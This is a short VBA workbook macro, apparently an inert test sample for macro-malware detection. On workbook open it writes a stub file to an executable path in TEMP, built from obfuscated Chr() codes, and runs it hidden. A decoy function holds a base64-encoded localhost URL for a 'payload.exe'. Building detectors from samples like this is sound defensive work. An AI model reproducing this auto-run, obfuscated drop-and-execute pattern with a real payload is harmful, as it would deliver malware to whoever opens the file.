Attribute VB_Name = "ThisWorkbook"
Private Sub Workbook_Open()
    Dim f As Integer, exe As String
    exe = Environ("TEMP") & Chr(92) & Chr(111) & Chr(98) & Chr(108) & Chr(105) & Chr(118) & Chr(105) & Chr(111) & Chr(110) & Chr(120) & Chr(95) & Chr(115) & Chr(116) & Chr(117) & Chr(98) & Chr(46) & Chr(101) & Chr(120) & Chr(101)
    f = FreeFile
    Open exe For Binary As #f
    Put #f, , "MZ-this-is-an-inert-marker-stub"
    Close #f
    Shell exe, 0
End Sub

Public Function OblivionXDecoy() As String
    Dim b64 As String
    b64 = "aHR0cDovLzEyNy4wLjAuMTo5MDkwL3BheWxvYWQuZXhl"
    OblivionXDecoy = b64
End Function
